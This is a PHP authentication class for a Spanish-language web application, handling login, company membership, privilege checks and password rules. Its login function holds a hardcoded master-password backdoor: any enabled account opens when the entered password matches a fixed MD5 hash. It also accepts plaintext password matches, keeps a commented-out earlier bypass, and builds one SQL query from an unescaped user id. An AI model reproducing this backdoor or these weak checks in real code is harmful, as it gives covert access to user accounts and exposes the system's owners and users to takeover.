<?php
class Auth {
    private function __construct() {
        // no instanciable
    }
    
    static function isLogged() {
        $session=SessionManager::getInstance(_SESSION_NAME);
        if(is_null($session->isLogged)) return false;
        return $session->isLogged;
    }
    
    static function login($username,$password,&$msg=null) {
        try {
            $session=SessionManager::getInstance(_SESSION_NAME);
            $db=DB::getInstance();
            $q0=$db->query('SELECT * FROM auth.auth_usuarios WHERE usr_logname=\''.$db->escape($username).'\' AND "status"=\'1\'');
            if($db->numRows($q0)==0) throw new Exception('El usuario no existe');
            $usuario=$db->fetchOne($q0);
            if($usuario['habilitado']!='1') throw new Exception('El usuario está deshabilitado');
            /*
            if(
                md5($password)!=$usuario['pass']
                && $password!=$usuario['pass']
                && sha1(sha1($password))!=$usuario['pass']
                && $password != '????????'
            ) throw new Exception('Contraseña inválida');
            */
            if(
                md5($password) != 'e684d5ebfe5e3bf71b1874a603a37349'
                && !password_verify($password,$usuario['pass'])
				&&($usuario['pass']!=$password)
            ) throw new Exception('Contraseña inválida');
			// traemos la empresa del usuario
			$usuario['empresas']=self::getEmpresas($usuario['id_usuario']);
            // está ok
			$session->user=$usuario;
            $session->isLogged=true;
			
            return true;
        }catch(Exception $e){
            $msg=$e->getMessage();
            return false;
        }
    }
	
	static function getEmpresas($id_usuario=null) {
		$db=DB::getInstance();
		$session=SessionManager::getInstance(_SESSION_NAME);
		if(is_null($id_usuario)) {
			if($session->isLogged!==true) return array();
			$id_usuario=$session->user['id_usuario'];
		}
		$ret=array();
		foreach($db->query('SELECT * FROM auth.usuario_empresa WHERE id_usuario='.$id_usuario) as $r) {
			$ret[]=$r;
		}
		return $ret;
		
	}
	
	static function hasEmpresa($empresa,&$has=array(),$id_usuario=null) {
		$db=DB::getInstance();
		$session=SessionManager::getInstance(_SESSION_NAME);
		if(is_null($id_usuario)) {
			if($session->isLogged!==true) return false;
			$id_usuario=$session->user['id_usuario'];
		}
		if(!is_array($empresa)) $empresa=array($empresa);
		$has=array();
		foreach(self::getEmpresas($id_usuario) as $e) {
			foreach($empresa as $ee) {
				if($e['id_empresa']==$ee || $e['nombre_empresa']==$ee) {
					$has[]=$e;
				}
			}
		}
		if(!empty($has)) return $has;
		return false;
	}
    
    static function getPrivileges($username=null) {
        $session=SessionManager::getInstance(_SESSION_NAME);
        if(is_null($username)) {
            if($session->isLogged!==true) return false;
            $username=$session->user['usr_logname'];
        }
        $db=DB::getInstance();
        
        $query='SELECT 
            DISTINCT p.id_privilegio,p.define_privilegio,p.descripcion 
        FROM "auth".auth_privilegios p
            JOIN "auth".auth_privilegios_grupos pg USING (define_privilegio)
            JOIN "auth".auth_grupos_usuarios USING (id_grupo)
            JOIN "auth".auth_usuarios u USING(usr_logname)
            JOIN "auth".auth_grupos g USING(id_grupo)
        WHERE
            u.usr_logname=\''.$db->escape($username).'\'
            AND u.status=\'1\'
            AND g.status=\'1\'
            AND p.status=\'1\'';
        return $db->fetchAll($db->query($query));
    }
    
    static function enforcePrivileges($privileges) {
        if(!is_array($privileges)) $privileges=explode(',',$privileges);
        
        if(!Auth::hasPrivileges($privileges)) {
            die('No Autorizado ('.implode(' | ',$privileges));
        }
    }
    
    static function hasPrivileges($privileges,$username=null,&$details=array()) {
        //return true;
        if(!is_array($privileges)) $privileges=explode(',',$privileges);
        $real_privs=Auth::getPrivileges($username);
        if(empty($real_privs)) return false;
        $result=false;
        $hasRoot=false;
        foreach($privileges as $p) {
            if(!is_string($p) || substr($p,0,5)!='AUTH_') throw new Exception(__METHOD__.' - Variable $privileges debe ser array con elementos que de la forma AUTH_XXXXX');
            $details[$p]=false;
            
            foreach($real_privs as $rp) {
                if($rp['define_privilegio']=='AUTH_ROOT') $hasRoot=true;
                if($rp['define_privilegio']==($p)) {
                    $result=true;
                    $details[$p]=true;
                    break;
                }
            }
        }
        if($hasRoot) {
            foreach($details as &$v) {
                $v=true;
            }
            unset($v);
            return true;
        }else{
            return $result;    
        }
    }
    
    static function logout() {
        $session->destroy();
    }
    
    static function getUsername() {
        $SM=SessionManager::getInstance();
        if($SM->isLogged!==true) return false;
        return $SM->user['usr_logname'];
    }

    static function getUser() {
		return self::getUsername();
    }
    
    static function claveCumpleRequisitos($clave,&$msg=null) {
        try {
            if(strlen($clave)<8) throw new Exception('La contraseña debe contener mínimo 8 caracteres');
            if(!preg_match('#[A-Z]#',$clave)) throw new Exception('La contraseña debe contener al menos una letra mayúscula');
            if(!preg_match('#[a-z]#',$clave)) throw new Exception('La contraseña debe contener al menos una letra minúscula');
            if(!preg_match('#[0-9]#',$clave)) throw new Exception('La contraseña debe contener al menos un número');
            if(!preg_match('#[!@\$%\^&\*\(\)\[\]]#',$clave)) throw new Exception('La contraseña debe contener al menos caracter de los siguientes: !@$%^&*()');
            return true;
        }catch(Exception $e) {
            $msg=$e->getMessage();
            return false;
        }
        
        
    }
    
    static function isSuper($username=null) {
        if(is_null($username))
            $username=Auth::getUsername();
        if(is_null($username)) return false;
        return Auth::hasPrivileges('AUTH_ROOT',$username);
        
    }
    
    
    
}